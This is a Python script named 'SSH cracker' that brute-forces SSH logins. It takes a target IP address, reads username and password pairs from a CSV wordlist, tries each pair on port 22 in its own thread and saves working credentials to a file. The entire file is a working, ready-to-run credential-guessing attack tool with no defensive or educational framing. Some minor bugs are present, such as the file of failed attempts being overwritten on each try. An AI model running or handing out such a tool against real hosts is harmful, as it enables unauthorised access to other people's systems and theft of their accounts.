from colorama import *
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import pyfiglet
import csv
import ipaddress
import threading
import time
import logging

init()
GREEN = Fore.GREEN
RESET = Fore.RESET
RED = Fore.RED
BRIGHT = Style.BRIGHT
NORMAL = Style.NORMAL
DIM = Style.DIM

name = "SSH cracker"
ascii_banner = pyfiglet.figlet_format(f"{name}")
print(ascii_banner)

# This function is responsible for the ssh client connecting.
def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    # Set the host policies. We add the new hostname and new host key to the local HostKeys object.
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        # We attempt to connect to the host, on port 22 which is ssh, with password, and username that was read from the csv file.
        ssh_client.connect(host,port=22,username=username, password=password, banner_timeout=300)
        # If it didn't throw an exception, we know the credentials were successful, so we write it to a file.
        with open("credentials_found.csv", "a") as fh:
            # We write the credentials that worked to a file.
            print(f"{GREEN}{BRIGHT}Username - {username} and Password - **** found.{RESET}")
            fh.write(f"{GREEN}Username: {username}\nPassword: {password}\nWorked on host {RESET}{host}\n")
    
    except AuthenticationException:
        with open('data.csv', mode='w', newline='') as fh:
            data = {'username': {username},"password":{password}}
            writer = csv.writer(fh)
            for row in data:
                writer.writerow(row)
            # We write the credentials that did not work to a file.
            print(f"{RED}Username - {username} and Password - **** is Incorrect.{RESET}")
    
    except ssh_exception.SSHException:
        print(f"{RED}**** Attempting to connect - Rate limiting on server ****")
# This function gets a valid IP address from the user. 
def get_ip_address():
    # We create a while loop, that we'll break out of only once we've received a valid IP Address.
    while True:
        host = input("Please enter the host ip address: ")
        try:
            # Check if host is a valid IPv4 address. If so we return host.
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            # If host is not a valid IPv4 address we send the message that the user should enter a valid ip address.
            print("Please enter a valid ip address.")

# The program will start in the main function.
def __main__():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    # To keep to functional programming standards we declare ssh_port inside a function.
    list_file="passwords.csv"
    host = get_ip_address()
    # This function reads a csv file with passwords.
    with open(list_file) as fh:
        csv_reader = csv.reader(fh, delimiter=",")
        # We use the enumerate() on the csv_reader object. This allows us to access the index and the data.
        for index, row in enumerate(csv_reader):
            # The 0 index is where the headings are allocated.
            if index == 0:
                continue
            else:
                #  We create a thread on the ssh_connect function, and send the correct arguments to it.
                t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1],))
                # We start the thread.
                t.start()
                # We leave a small time between starting a new connection thread.
                time.sleep(0.2)
                # ssh_connect(host, ssh_port, row[0], row[1])

#  We run the main function where execution starts.
__main__()